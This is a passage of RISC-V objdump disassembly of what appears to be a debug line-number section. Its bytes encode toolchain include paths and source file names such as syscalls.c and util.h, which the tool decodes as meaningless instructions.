     848:	72730063          	beq	t1,t2,f68 <_tbss_end+0xee4>
     84c:	6f2f0063          	beq	t5,s2,f2c <_tbss_end+0xea8>
     850:	7470                	ld	a2,232(s0)
     852:	7369722f          	0x7369722f
     856:	34367663          	bleu	gp,a2,ba2 <_tbss_end+0xb1e>
     85a:	7369722f          	0x7369722f
     85e:	34367663          	bleu	gp,a2,baa <_tbss_end+0xb26>
     862:	752d                	lui	a0,0xfffeb
     864:	6b6e                	ld	s6,216(sp)
     866:	6f6e                	ld	t5,216(sp)
     868:	652d6e77          	0x652d6e77
     86c:	666c                	ld	a1,200(a2)
     86e:	636e692f          	0x636e692f
     872:	756c                	ld	a1,232(a0)
     874:	6564                	ld	s1,200(a0)
     876:	2f00                	fld	fs0,24(a4)
     878:	2f74706f          	j	4836e <_tbss_end+0x482ea>
     87c:	6972                	ld	s2,280(sp)
     87e:	36766373          	csrrsi	t1,0x367,12
     882:	2f34                	fld	fa3,88(a4)
     884:	6972                	ld	s2,280(sp)
     886:	36766373          	csrrsi	t1,0x367,12
     88a:	2d34                	fld	fa3,88(a0)
     88c:	6e75                	lui	t3,0x1d
     88e:	776f6e6b          	0x776f6e6b
     892:	2d6e                	fld	fs10,216(sp)
     894:	6c65                	lui	s8,0x19
     896:	2f66                	fld	ft10,88(sp)
     898:	6e69                	lui	t3,0x1a
     89a:	64756c63          	bltu	a0,t2,ef2 <_tbss_end+0xe6e>
     89e:	2f65                	addiw	t5,t5,25
     8a0:	616d                	addi	sp,sp,240
     8a2:	6e696863          	bltu	s2,t1,f92 <_tbss_end+0xf0e>
     8a6:	0065                	c.nop	25
     8a8:	74706f2f          	0x74706f2f
     8ac:	7369722f          	0x7369722f
     8b0:	34367663          	bleu	gp,a2,bfc <_tbss_end+0xb78>
     8b4:	7369722f          	0x7369722f
     8b8:	34367663          	bleu	gp,a2,c04 <_tbss_end+0xb80>
     8bc:	752d                	lui	a0,0xfffeb
     8be:	6b6e                	ld	s6,216(sp)
     8c0:	6f6e                	ld	t5,216(sp)
     8c2:	652d6e77          	0x652d6e77
     8c6:	666c                	ld	a1,200(a2)
     8c8:	636e692f          	0x636e692f
     8cc:	756c                	ld	a1,232(a0)
     8ce:	6564                	ld	s1,200(a0)
     8d0:	7379732f          	0x7379732f
     8d4:	2f00                	fld	fs0,24(a4)
     8d6:	2f74706f          	j	483cc <_tbss_end+0x48348>
     8da:	6972                	ld	s2,280(sp)
     8dc:	36766373          	csrrsi	t1,0x367,12
     8e0:	2f34                	fld	fa3,88(a4)
     8e2:	696c                	ld	a1,208(a0)
     8e4:	2f62                	fld	ft10,24(sp)
     8e6:	2f636367          	0x2f636367
     8ea:	6972                	ld	s2,280(sp)
     8ec:	36766373          	csrrsi	t1,0x367,12
     8f0:	2d34                	fld	fa3,88(a0)
     8f2:	6e75                	lui	t3,0x1d
     8f4:	776f6e6b          	0x776f6e6b
     8f8:	2d6e                	fld	fs10,216(sp)
     8fa:	6c65                	lui	s8,0x19
     8fc:	2f66                	fld	ft10,88(sp)
     8fe:	2e322e37          	lui	t3,0x2e322
     902:	2f30                	fld	fa2,88(a4)
     904:	6e69                	lui	t3,0x1a
     906:	64756c63          	bltu	a0,t2,f5e <_tbss_end+0xeda>
     90a:	0065                	c.nop	25
     90c:	7500                	ld	s0,40(a0)
     90e:	6974                	ld	a3,208(a0)
     910:	2e6c                	fld	fa1,216(a2)
     912:	0068                	addi	a0,sp,12
     914:	0001                	nop
     916:	7300                	ld	s0,32(a4)
     918:	7379                	lui	t1,0xffffe
     91a:	6c6c6163          	bltu	s8,t1,fdc <_tbss_end+0xf58>
     91e:	00632e73          	csrrs	t3,0x6,t1
     922:	0002                	c.slli	zero,0x0
     924:	7300                	ld	s0,32(a4)
     926:	6474                	ld	a3,200(s0)
     928:	6f69                	lui	t5,0x1a
     92a:	682e                	ld	a6,200(sp)
     92c:	0300                	addi	s0,sp,384
     92e:	0000                	unimp
     930:	645f 6665 7561      	0x75616665645f
     936:	746c                	ld	a1,232(s0)
     938:	745f 7079 7365      	0x73657079745f
     93e:	682e                	ld	a6,200(sp)
     940:	0400                	addi	s0,sp,512
     942:	0000                	unimp
     944:	735f 6474 6e69      	0x6e696474735f
     94a:	2e74                	fld	fa3,216(a2)
     94c:	0068                	addi	a0,sp,12
     94e:	0005                	c.nop	1
     950:	7300                	ld	s0,32(a4)
     952:	6474                	ld	a3,200(s0)
     954:	6564                	ld	s1,200(a0)
     956:	2e66                	fld	ft8,88(sp)
     958:	0068                	addi	a0,sp,12
     95a:	0006                	c.slli	zero,0x1
     95c:	6c00                	ld	s0,24(s0)
     95e:	2e6b636f          	jal	t1,b6c44 <_tbss_end+0xb6bc0>
     962:	0068                	addi	a0,sp,12
     964:	0005                	c.nop	1
     966:	5f00                	lw	s0,56(a4)
     968:	7974                	ld	a3,240(a0)
     96a:	6570                	ld	a2,200(a0)
     96c:	00682e73          	csrrs	t3,0x6,a6
     970:	0005                	c.nop	1
     972:	7200                	ld	s0,32(a2)
     974:	6565                	lui	a0,0x19
     976:	746e                	ld	s0,248(sp)
     978:	682e                	ld	a6,200(sp)
     97a:	0500                	addi	s0,sp,640
     97c:	0000                	unimp
     97e:	61647473          	csrrci	s0,0x616,8
     982:	6772                	ld	a4,280(sp)
     984:	682e                	ld	a6,200(sp)
     986:	0600                	addi	s0,sp,768
     988:	0000                	unimp
     98a:	69727473          	csrrci	s0,0x697,4
     98e:	676e                	ld	a4,216(sp)
     990:	682e                	ld	a6,200(sp)
     992:	0300                	addi	s0,sp,384
     994:	0000                	unimp
     996:	0000                	unimp
     998:	0209                	addi	tp,tp,2
     99a:	14d6                	slli	s1,s1,0x35
     99c:	8000                	0x8000
     99e:	0000                	unimp
     9a0:	0000                	unimp
     9a2:	03012803          	lw	a6,48(sp)
     9a6:	0908                	addi	a0,sp,144
     9a8:	0014                	0x14
     9aa:	0301                	addi	t1,t1,0
     9ac:	00080903          	lb	s2,0(a6)
     9b0:	0301                	addi	t1,t1,0
     9b2:	0908                	addi	a0,sp,144
     9b4:	0014                	0x14
     9b6:	0301                	addi	t1,t1,0
     9b8:	00080903          	lb	s2,0(a6)
     9bc:	0301                	addi	t1,t1,0
     9be:	00140903          	lb	s2,1(s0)
     9c2:	0301                	addi	t1,t1,0
     9c4:	0902                	slli	s2,s2,0x0
     9c6:	0006                	c.slli	zero,0x1
     9c8:	0301                	addi	t1,t1,0
     9ca:	0901                	addi	s2,s2,0
     9cc:	0026                	c.slli	zero,0x9
     9ce:	0301                	addi	t1,t1,0
     9d0:	0901                	addi	s2,s2,0
     9d2:	0026                	c.slli	zero,0x9
     9d4:	0001                	nop
     9d6:	0402                	slli	s0,s0,0x0
     9d8:	0601                	addi	a2,a2,0
     9da:	10090003          	lb	zero,256(s2)
     9de:	0100                	addi	s0,sp,128
     9e0:	0306                	slli	t1,t1,0x1
     9e2:	0901                	addi	s2,s2,0
     9e4:	000a                	c.slli	zero,0x2
     9e6:	0001                	nop
     9e8:	0402                	slli	s0,s0,0x0
     9ea:	0601                	addi	a2,a2,0
     9ec:	10090003          	lb	zero,256(s2)
     9f0:	0100                	addi	s0,sp,128
     9f2:	0200                	addi	s0,sp,256
     9f4:	0204                	addi	s1,sp,256
     9f6:	0306                	slli	t1,t1,0x1
     9f8:	000a097b          	0xa097b
     9fc:	0001                	nop
     9fe:	0402                	slli	s0,s0,0x0
     a00:	0601                	addi	a2,a2,0
     a02:	0a090003          	lb	zero,160(s2)
     a06:	0100                	addi	s0,sp,128
     a08:	0306                	slli	t1,t1,0x1
     a0a:	00220907          	0x220907
     a0e:	0001                	nop
     a10:	0402                	slli	s0,s0,0x0
     a12:	0601                	addi	a2,a2,0
     a14:	0a090003          	lb	zero,160(s2)
     a18:	0100                	addi	s0,sp,128
     a1a:	0306                	slli	t1,t1,0x1
     a1c:	0901                	addi	s2,s2,0
     a1e:	002a                	c.slli	zero,0xa
     a20:	0301                	addi	t1,t1,0
     a22:	0901                	addi	s2,s2,0
     a24:	0006                	c.slli	zero,0x1
     a26:	0301                	addi	t1,t1,0
     a28:	0901                	addi	s2,s2,0
     a2a:	0002                	c.slli	zero,0x0
     a2c:	0301                	addi	t1,t1,0
     a2e:	00080903          	lb	s2,0(a6)
     a32:	0301                	addi	t1,t1,0
     a34:	00140903          	lb	s2,1(s0)
     a38:	0301                	addi	t1,t1,0
     a3a:	0902                	slli	s2,s2,0x0
     a3c:	0006                	c.slli	zero,0x1
     a3e:	0301                	addi	t1,t1,0
     a40:	0901                	addi	s2,s2,0
     a42:	0026                	c.slli	zero,0x9
     a44:	0301                	addi	t1,t1,0
     a46:	0901                	addi	s2,s2,0
     a48:	0026                	c.slli	zero,0x9
     a4a:	0301                	addi	t1,t1,0
     a4c:	0901                	addi	s2,s2,0
     a4e:	0030                	addi	a2,sp,8
     a50:	0001                	nop
     a52:	0402                	slli	s0,s0,0x0
     a54:	0601                	addi	a2,a2,0
     a56:	0e090003          	lb	zero,224(s2)
     a5a:	0100                	addi	s0,sp,128
     a5c:	0200                	addi	s0,sp,256
     a5e:	0204                	addi	s1,sp,256
     a60:	0306                	slli	t1,t1,0x1
     a62:	0012097b          	0x12097b
     a66:	0001                	nop
     a68:	0402                	slli	s0,s0,0x0
     a6a:	0601                	addi	a2,a2,0
     a6c:	0a090003          	lb	zero,160(s2)
     a70:	0100                	addi	s0,sp,128
     a72:	0306                	slli	t1,t1,0x1
     a74:	00220907          	0x220907
     a78:	0001                	nop
     a7a:	0402                	slli	s0,s0,0x0
     a7c:	0601                	addi	a2,a2,0
     a7e:	0a090003          	lb	zero,160(s2)
     a82:	0100                	addi	s0,sp,128
     a84:	0306                	slli	t1,t1,0x1
     a86:	0901                	addi	s2,s2,0
     a88:	0026                	c.slli	zero,0x9
     a8a:	0301                	addi	t1,t1,0
     a8c:	0901                	addi	s2,s2,0
     a8e:	0006                	c.slli	zero,0x1
     a90:	0301                	addi	t1,t1,0
     a92:	0901                	addi	s2,s2,0
     a94:	0002                	c.slli	zero,0x0
     a96:	0301                	addi	t1,t1,0
     a98:	00080903          	lb	s2,0(a6)
     a9c:	0301                	addi	t1,t1,0
     a9e:	0905                	addi	s2,s2,1
     aa0:	000c                	0xc
     aa2:	0301                	addi	t1,t1,0
     aa4:	0902                	slli	s2,s2,0x0
     aa6:	0004                	0x4
     aa8:	0301                	addi	t1,t1,0
     aaa:	0901                	addi	s2,s2,0
     aac:	0014                	0x14
     aae:	0301                	addi	t1,t1,0
     ab0:	0902                	slli	s2,s2,0x0
     ab2:	0026                	c.slli	zero,0x9
     ab4:	0301                	addi	t1,t1,0
     ab6:	0901                	addi	s2,s2,0
     ab8:	000c                	0xc
     aba:	0301                	addi	t1,t1,0
     abc:	0902                	slli	s2,s2,0x0
     abe:	0010                	0x10
     ac0:	0001                	nop
     ac2:	0402                	slli	s0,s0,0x0
     ac4:	0601                	addi	a2,a2,0
     ac6:	02090003          	lb	zero,32(s2)
     aca:	0100                	addi	s0,sp,128
     acc:	0306                	slli	t1,t1,0x1
     ace:	00160903          	lb	s2,1(a2) # 19001 <_tbss_end+0x18f7d>
     ad2:	0301                	addi	t1,t1,0
     ad4:	0901                	addi	s2,s2,0
     ad6:	0004                	0x4
     ad8:	0301                	addi	t1,t1,0
     ada:	00080903          	lb	s2,0(a6)
     ade:	0301                	addi	t1,t1,0
     ae0:	0901                	addi	s2,s2,0
     ae2:	000a                	c.slli	zero,0x2
     ae4:	0301                	addi	t1,t1,0
     ae6:	0901                	addi	s2,s2,0
     ae8:	0014                	0x14
     aea:	0301                	addi	t1,t1,0
     aec:	0901                	addi	s2,s2,0
     aee:	0010                	0x10
     af0:	0401                	addi	s0,s0,0
     af2:	0302                	slli	t1,t1,0x0
     af4:	7f9d                	lui	t6,0xfffe7
     af6:	0809                	addi	a6,a6,2
     af8:	0100                	addi	s0,sp,128
     afa:	26090203          	lb	tp,608(s2)
     afe:	0100                	addi	s0,sp,128
     b00:	06090103          	lb	sp,96(s2)
     b04:	0100                	addi	s0,sp,128
     b06:	06090103          	lb	sp,96(s2)
     b0a:	0100                	addi	s0,sp,128
     b0c:	06090103          	lb	sp,96(s2)
     b10:	0100                	addi	s0,sp,128
     b12:	06090103          	lb	sp,96(s2)
     b16:	0100                	addi	s0,sp,128
     b18:	04090203          	lb	tp,64(s2)
     b1c:	0100                	addi	s0,sp,128
     b1e:	0c090103          	lb	sp,192(s2)
     b22:	0100                	addi	s0,sp,128
     b24:	0200                	addi	s0,sp,256
     b26:	0104                	addi	s1,sp,128
     b28:	0306                	slli	t1,t1,0x1
     b2a:	0900                	addi	s0,sp,144
     b2c:	0002                	c.slli	zero,0x0
     b2e:	0601                	addi	a2,a2,0
     b30:	0c090203          	lb	tp,192(s2)
     b34:	0100                	addi	s0,sp,128
     b36:	0c090203          	lb	tp,192(s2)
     b3a:	0100                	addi	s0,sp,128
     b3c:	04090103          	lb	sp,64(s2)
     b40:	0100                	addi	s0,sp,128
     b42:	02090103          	lb	sp,32(s2)
     b46:	0100                	addi	s0,sp,128
     b48:	08090703          	lb	a4,128(s2)
     b4c:	0100                	addi	s0,sp,128
     b4e:	0c090103          	lb	sp,192(s2)
     b52:	0100                	addi	s0,sp,128
     b54:	0200                	addi	s0,sp,256
     b56:	0104                	addi	s1,sp,128
     b58:	04090803          	lb	a6,64(s2)
     b5c:	0100                	addi	s0,sp,128
     b5e:	0200                	addi	s0,sp,256
     b60:	0204                	addi	s1,sp,256
     b62:	0306                	slli	t1,t1,0x1
     b64:	0900                	addi	s0,sp,144
     b66:	000e                	c.slli	zero,0x3
     b68:	0001                	nop
     b6a:	0402                	slli	s0,s0,0x0
     b6c:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     b70:	0018                	0x18
     b72:	0001                	nop
     b74:	0402                	slli	s0,s0,0x0
     b76:	0305                	addi	t1,t1,1
     b78:	0900                	addi	s0,sp,144
     b7a:	0038                	addi	a4,sp,8
     b7c:	0001                	nop
     b7e:	0402                	slli	s0,s0,0x0
     b80:	0601                	addi	a2,a2,0
     b82:	1e090103          	lb	sp,480(s2)
     b86:	0100                	addi	s0,sp,128
     b88:	0200                	addi	s0,sp,256
     b8a:	0204                	addi	s1,sp,256
     b8c:	0306                	slli	t1,t1,0x1
     b8e:	0900                	addi	s0,sp,144
     b90:	000e                	c.slli	zero,0x3
     b92:	0001                	nop
     b94:	0402                	slli	s0,s0,0x0
     b96:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     b9a:	0018                	0x18
     b9c:	0001                	nop
     b9e:	0402                	slli	s0,s0,0x0
     ba0:	0305                	addi	t1,t1,1
     ba2:	0900                	addi	s0,sp,144
     ba4:	0038                	addi	a4,sp,8
     ba6:	0001                	nop
     ba8:	0402                	slli	s0,s0,0x0
     baa:	0605                	addi	a2,a2,1
     bac:	1e090303          	lb	t1,480(s2)
     bb0:	0100                	addi	s0,sp,128
     bb2:	08090303          	lb	t1,128(s2)
     bb6:	0100                	addi	s0,sp,128
     bb8:	0a090103          	lb	sp,160(s2)
     bbc:	0100                	addi	s0,sp,128
     bbe:	0200                	addi	s0,sp,256
     bc0:	0104                	addi	s1,sp,128
     bc2:	14090103          	lb	sp,320(s2)
     bc6:	0100                	addi	s0,sp,128
     bc8:	02090403          	lb	s0,32(s2)
     bcc:	0100                	addi	s0,sp,128
     bce:	14090103          	lb	sp,320(s2)
     bd2:	0100                	addi	s0,sp,128
     bd4:	08090403          	lb	s0,128(s2)
     bd8:	0100                	addi	s0,sp,128
     bda:	0e090103          	lb	sp,224(s2)
     bde:	0100                	addi	s0,sp,128
     be0:	0a090403          	lb	s0,160(s2)
     be4:	0100                	addi	s0,sp,128
     be6:	08090103          	lb	sp,128(s2)
     bea:	0100                	addi	s0,sp,128
     bec:	08090403          	lb	s0,128(s2)
     bf0:	0100                	addi	s0,sp,128
     bf2:	0e090103          	lb	sp,224(s2)
     bf6:	0100                	addi	s0,sp,128
     bf8:	1c090103          	lb	sp,448(s2)
     bfc:	0100                	addi	s0,sp,128
     bfe:	0c090303          	lb	t1,192(s2)
     c02:	0100                	addi	s0,sp,128
     c04:	0200                	addi	s0,sp,256
     c06:	0104                	addi	s1,sp,128
     c08:	14090303          	lb	t1,320(s2)
     c0c:	0100                	addi	s0,sp,128
     c0e:	08090103          	lb	sp,128(s2)
     c12:	0100                	addi	s0,sp,128
     c14:	08090303          	lb	t1,128(s2)
     c18:	0100                	addi	s0,sp,128
     c1a:	12090203          	lb	tp,288(s2)
     c1e:	0100                	addi	s0,sp,128
     c20:	0c090103          	lb	sp,192(s2)
     c24:	0100                	addi	s0,sp,128
     c26:	02090103          	lb	sp,32(s2)
     c2a:	0100                	addi	s0,sp,128
     c2c:	0a090303          	lb	t1,160(s2)
     c30:	0100                	addi	s0,sp,128
     c32:	08090403          	lb	s0,128(s2)
     c36:	0100                	addi	s0,sp,128
     c38:	10090103          	lb	sp,256(s2)
     c3c:	0100                	addi	s0,sp,128
     c3e:	14090103          	lb	sp,320(s2)
     c42:	0100                	addi	s0,sp,128
     c44:	10090103          	lb	sp,256(s2)
     c48:	0100                	addi	s0,sp,128
     c4a:	14090103          	lb	sp,320(s2)
     c4e:	0100                	addi	s0,sp,128
     c50:	0a090303          	lb	t1,160(s2)
     c54:	0100                	addi	s0,sp,128
     c56:	2a090103          	lb	sp,672(s2)
     c5a:	0100                	addi	s0,sp,128
     c5c:	04090103          	lb	sp,64(s2)
     c60:	0100                	addi	s0,sp,128
     c62:	10090303          	lb	t1,256(s2)
     c66:	0100                	addi	s0,sp,128
     c68:	0e090303          	lb	t1,224(s2)
     c6c:	0100                	addi	s0,sp,128
     c6e:	04090103          	lb	sp,64(s2)
     c72:	0100                	addi	s0,sp,128
     c74:	06090103          	lb	sp,96(s2)
     c78:	0100                	addi	s0,sp,128
     c7a:	14090103          	lb	sp,320(s2)
     c7e:	0100                	addi	s0,sp,128
     c80:	0200                	addi	s0,sp,256
     c82:	0204                	addi	s1,sp,256
     c84:	44097e03          	0x44097e03
     c88:	0100                	addi	s0,sp,128
     c8a:	0200                	addi	s0,sp,256
     c8c:	0104                	addi	s1,sp,128
     c8e:	0306                	slli	t1,t1,0x1
     c90:	0900                	addi	s0,sp,144
     c92:	000a                	c.slli	zero,0x2
     c94:	0601                	addi	a2,a2,0
     c96:	0e090303          	lb	t1,224(s2)
     c9a:	0100                	addi	s0,sp,128
     c9c:	08090103          	lb	sp,128(s2)
     ca0:	0100                	addi	s0,sp,128
     ca2:	06090203          	lb	tp,96(s2)
     ca6:	0100                	addi	s0,sp,128
     ca8:	0a090503          	lb	a0,160(s2)
     cac:	0100                	addi	s0,sp,128
     cae:	0e090403          	lb	s0,224(s2)
     cb2:	0100                	addi	s0,sp,128
     cb4:	22090203          	lb	tp,544(s2)
     cb8:	0100                	addi	s0,sp,128
     cba:	0200                	addi	s0,sp,256
     cbc:	0104                	addi	s1,sp,128
     cbe:	0306                	slli	t1,t1,0x1
     cc0:	0900                	addi	s0,sp,144
     cc2:	000e                	c.slli	zero,0x3
     cc4:	0601                	addi	a2,a2,0
     cc6:	0e090203          	lb	tp,224(s2)
     cca:	0100                	addi	s0,sp,128
     ccc:	16090103          	lb	sp,352(s2)
     cd0:	0100                	addi	s0,sp,128
     cd2:	04090303          	lb	t1,64(s2)
     cd6:	0100                	addi	s0,sp,128
     cd8:	02090103          	lb	sp,32(s2)
     cdc:	0100                	addi	s0,sp,128
     cde:	0a090303          	lb	t1,160(s2)
     ce2:	0100                	addi	s0,sp,128
     ce4:	0c090303          	lb	t1,192(s2)
     ce8:	0100                	addi	s0,sp,128
     cea:	06090203          	lb	tp,96(s2)
     cee:	0100                	addi	s0,sp,128
     cf0:	0200                	addi	s0,sp,256
     cf2:	0104                	addi	s1,sp,128
     cf4:	0306                	slli	t1,t1,0x1
     cf6:	0900                	addi	s0,sp,144
     cf8:	001c                	0x1c
     cfa:	0001                	nop
     cfc:	0402                	slli	s0,s0,0x0
     cfe:	0302                	slli	t1,t1,0x0
     d00:	0900                	addi	s0,sp,144
     d02:	0006                	c.slli	zero,0x1
     d04:	0001                	nop
     d06:	0402                	slli	s0,s0,0x0
     d08:	0304                	addi	s1,sp,384
     d0a:	0900                	addi	s0,sp,144
     d0c:	0004                	0x4
     d0e:	0001                	nop
     d10:	0402                	slli	s0,s0,0x0
     d12:	0604                	addi	s1,sp,768
     d14:	1c090103          	lb	sp,448(s2)
     d18:	0100                	addi	s0,sp,128
     d1a:	0200                	addi	s0,sp,256
     d1c:	0404                	addi	s1,sp,512
     d1e:	0a097d03          	0xa097d03
     d22:	0100                	addi	s0,sp,128
     d24:	0200                	addi	s0,sp,256
     d26:	0204                	addi	s1,sp,256
     d28:	0306                	slli	t1,t1,0x1
     d2a:	0900                	addi	s0,sp,144
     d2c:	000a                	c.slli	zero,0x2
     d2e:	0601                	addi	a2,a2,0
     d30:	0e090503          	lb	a0,224(s2)
     d34:	0100                	addi	s0,sp,128
     d36:	04090203          	lb	tp,64(s2)
     d3a:	0100                	addi	s0,sp,128
     d3c:	0a090103          	lb	sp,160(s2)
     d40:	0100                	addi	s0,sp,128
     d42:	0a090403          	lb	s0,160(s2)
     d46:	0100                	addi	s0,sp,128
     d48:	2c090203          	lb	tp,704(s2)
     d4c:	0100                	addi	s0,sp,128
     d4e:	04090403          	lb	s0,64(s2)
     d52:	0100                	addi	s0,sp,128
     d54:	28090103          	lb	sp,640(s2)
     d58:	0100                	addi	s0,sp,128
     d5a:	0c090203          	lb	tp,192(s2)
     d5e:	0100                	addi	s0,sp,128
     d60:	10097d03          	0x10097d03
     d64:	0100                	addi	s0,sp,128
     d66:	02090203          	lb	tp,32(s2)
     d6a:	0100                	addi	s0,sp,128
     d6c:	02090403          	lb	s0,32(s2)
     d70:	0100                	addi	s0,sp,128
     d72:	02090103          	lb	sp,32(s2)
     d76:	0100                	addi	s0,sp,128
     d78:	10097f03          	0x10097f03
     d7c:	0100                	addi	s0,sp,128
     d7e:	16090303          	lb	t1,352(s2)
     d82:	0100                	addi	s0,sp,128
     d84:	02090103          	lb	sp,32(s2)
     d88:	0100                	addi	s0,sp,128
     d8a:	0200                	addi	s0,sp,256
     d8c:	0104                	addi	s1,sp,128
     d8e:	0306                	slli	t1,t1,0x1
     d90:	0900                	addi	s0,sp,144
     d92:	0028                	addi	a0,sp,8
     d94:	0001                	nop
     d96:	0402                	slli	s0,s0,0x0
     d98:	0302                	slli	t1,t1,0x0
     d9a:	0900                	addi	s0,sp,144
     d9c:	0006                	c.slli	zero,0x1
     d9e:	0001                	nop
     da0:	0402                	slli	s0,s0,0x0
     da2:	0304                	addi	s1,sp,384
     da4:	0900                	addi	s0,sp,144
     da6:	0004                	0x4
     da8:	0601                	addi	a2,a2,0
     daa:	12097f03          	0x12097f03
     dae:	0100                	addi	s0,sp,128
     db0:	10090203          	lb	tp,256(s2)
     db4:	0100                	addi	s0,sp,128
     db6:	0a090303          	lb	t1,160(s2)
     dba:	0100                	addi	s0,sp,128
     dbc:	10090103          	lb	sp,256(s2)
     dc0:	0100                	addi	s0,sp,128
     dc2:	0e090103          	lb	sp,224(s2)
     dc6:	0100                	addi	s0,sp,128
     dc8:	14090103          	lb	sp,320(s2)
     dcc:	0100                	addi	s0,sp,128
     dce:	08090103          	lb	sp,128(s2)
     dd2:	0100                	addi	s0,sp,128
     dd4:	14090203          	lb	tp,320(s2)
     dd8:	0100                	addi	s0,sp,128
     dda:	16090103          	lb	sp,352(s2)
     dde:	0100                	addi	s0,sp,128
     de0:	08090303          	lb	t1,128(s2)
     de4:	0100                	addi	s0,sp,128
     de6:	10090103          	lb	sp,256(s2)
     dea:	0100                	addi	s0,sp,128
     dec:	0e090103          	lb	sp,224(s2)
     df0:	0100                	addi	s0,sp,128
     df2:	14090103          	lb	sp,320(s2)
     df6:	0100                	addi	s0,sp,128
     df8:	08090103          	lb	sp,128(s2)
     dfc:	0100                	addi	s0,sp,128
     dfe:	14090203          	lb	tp,320(s2)
     e02:	0100                	addi	s0,sp,128
     e04:	12090103          	lb	sp,288(s2)
     e08:	0100                	addi	s0,sp,128
     e0a:	08090303          	lb	t1,128(s2)
     e0e:	0100                	addi	s0,sp,128
     e10:	1c090903          	lb	s2,448(s2)
     e14:	0100                	addi	s0,sp,128
     e16:	02090103          	lb	sp,32(s2)
     e1a:	0100                	addi	s0,sp,128
     e1c:	04090203          	lb	tp,64(s2)
     e20:	0100                	addi	s0,sp,128
     e22:	0a090103          	lb	sp,160(s2)
     e26:	0100                	addi	s0,sp,128
     e28:	0c097c03          	0xc097c03
     e2c:	0100                	addi	s0,sp,128
     e2e:	16090603          	lb	a2,352(s2)
     e32:	0100                	addi	s0,sp,128
     e34:	0a090303          	lb	t1,160(s2)
     e38:	0100                	addi	s0,sp,128
     e3a:	08090103          	lb	sp,128(s2)
     e3e:	0100                	addi	s0,sp,128
     e40:	08090103          	lb	sp,128(s2)
     e44:	0100                	addi	s0,sp,128
     e46:	06090103          	lb	sp,96(s2)
     e4a:	0100                	addi	s0,sp,128
     e4c:	06090103          	lb	sp,96(s2)
     e50:	0100                	addi	s0,sp,128
     e52:	04090103          	lb	sp,64(s2)
     e56:	0100                	addi	s0,sp,128
     e58:	04090203          	lb	tp,64(s2)
     e5c:	0100                	addi	s0,sp,128
     e5e:	4a090403          	lb	s0,1184(s2)
     e62:	0100                	addi	s0,sp,128
     e64:	08090103          	lb	sp,128(s2)
     e68:	0100                	addi	s0,sp,128
     e6a:	02090403          	lb	s0,32(s2)
     e6e:	0100                	addi	s0,sp,128
     e70:	08090103          	lb	sp,128(s2)
     e74:	0100                	addi	s0,sp,128
     e76:	02090c03          	lb	s8,32(s2)
     e7a:	0100                	addi	s0,sp,128
     e7c:	04090103          	lb	sp,64(s2)
     e80:	0100                	addi	s0,sp,128
     e82:	1e090103          	lb	sp,480(s2)
     e86:	0100                	addi	s0,sp,128
     e88:	0c090103          	lb	sp,192(s2)
     e8c:	0100                	addi	s0,sp,128
     e8e:	0200                	addi	s0,sp,256
     e90:	0104                	addi	s1,sp,128
     e92:	0306                	slli	t1,t1,0x1
     e94:	0900                	addi	s0,sp,144
     e96:	000a                	c.slli	zero,0x2
     e98:	0601                	addi	a2,a2,0
     e9a:	0a097d03          	0xa097d03
     e9e:	0100                	addi	s0,sp,128
     ea0:	0a090103          	lb	sp,160(s2)
     ea4:	0100                	addi	s0,sp,128
     ea6:	02090803          	lb	a6,32(s2)
     eaa:	0100                	addi	s0,sp,128
     eac:	12090103          	lb	sp,288(s2)
     eb0:	0100                	addi	s0,sp,128
     eb2:	02090303          	lb	t1,32(s2)
     eb6:	0100                	addi	s0,sp,128
     eb8:	0a090103          	lb	sp,160(s2)
     ebc:	0100                	addi	s0,sp,128
     ebe:	04090103          	lb	sp,64(s2)
     ec2:	0100                	addi	s0,sp,128
     ec4:	02090303          	lb	t1,32(s2)
     ec8:	0100                	addi	s0,sp,128
     eca:	06090103          	lb	sp,96(s2)
     ece:	0100                	addi	s0,sp,128
     ed0:	02097303          	0x2097303
     ed4:	0100                	addi	s0,sp,128
     ed6:	02091003          	lh	zero,32(s2)
     eda:	0100                	addi	s0,sp,128
     edc:	0a090103          	lb	sp,160(s2)
     ee0:	0100                	addi	s0,sp,128
     ee2:	0e090103          	lb	sp,224(s2)
     ee6:	0100                	addi	s0,sp,128
     ee8:	02090403          	lb	s0,32(s2)
     eec:	0100                	addi	s0,sp,128
     eee:	0a090103          	lb	sp,160(s2)
     ef2:	0100                	addi	s0,sp,128
     ef4:	02090403          	lb	s0,32(s2)
     ef8:	0100                	addi	s0,sp,128
     efa:	1a090103          	lb	sp,416(s2)
     efe:	0100                	addi	s0,sp,128
     f00:	02090403          	lb	s0,32(s2)
     f04:	0100                	addi	s0,sp,128
     f06:	14090103          	lb	sp,320(s2)
     f0a:	0100                	addi	s0,sp,128
     f0c:	08090103          	lb	sp,128(s2)
     f10:	0100                	addi	s0,sp,128
     f12:	0200                	addi	s0,sp,256
     f14:	0104                	addi	s1,sp,128
     f16:	0306                	slli	t1,t1,0x1
     f18:	0900                	addi	s0,sp,144
     f1a:	000a                	c.slli	zero,0x2
     f1c:	0601                	addi	a2,a2,0
     f1e:	10090103          	lb	sp,256(s2)
     f22:	0100                	addi	s0,sp,128
     f24:	0200                	addi	s0,sp,256
     f26:	0304                	addi	s1,sp,384
     f28:	20090103          	lb	sp,512(s2)
     f2c:	0100                	addi	s0,sp,128
     f2e:	0200                	addi	s0,sp,256
     f30:	0304                	addi	s1,sp,384
     f32:	12097f03          	0x12097f03
     f36:	0100                	addi	s0,sp,128
     f38:	0200                	addi	s0,sp,256
     f3a:	0104                	addi	s1,sp,128
     f3c:	0306                	slli	t1,t1,0x1
     f3e:	0900                	addi	s0,sp,144
     f40:	000a                	c.slli	zero,0x2
     f42:	0601                	addi	a2,a2,0
     f44:	0a090203          	lb	tp,160(s2)
     f48:	0100                	addi	s0,sp,128
     f4a:	0200                	addi	s0,sp,256
     f4c:	0504                	addi	s1,sp,640
     f4e:	02090103          	lb	sp,32(s2)
     f52:	0100                	addi	s0,sp,128
     f54:	0200                	addi	s0,sp,256
     f56:	0504                	addi	s1,sp,640
     f58:	0c090103          	lb	sp,192(s2)
     f5c:	0100                	addi	s0,sp,128
     f5e:	0200                	addi	s0,sp,256
     f60:	0504                	addi	s1,sp,640
     f62:	02097e03          	0x2097e03
     f66:	0100                	addi	s0,sp,128
     f68:	0200                	addi	s0,sp,256
     f6a:	0104                	addi	s1,sp,128
     f6c:	0306                	slli	t1,t1,0x1
     f6e:	0900                	addi	s0,sp,144
     f70:	000a                	c.slli	zero,0x2
     f72:	0001                	nop
     f74:	0402                	slli	s0,s0,0x0
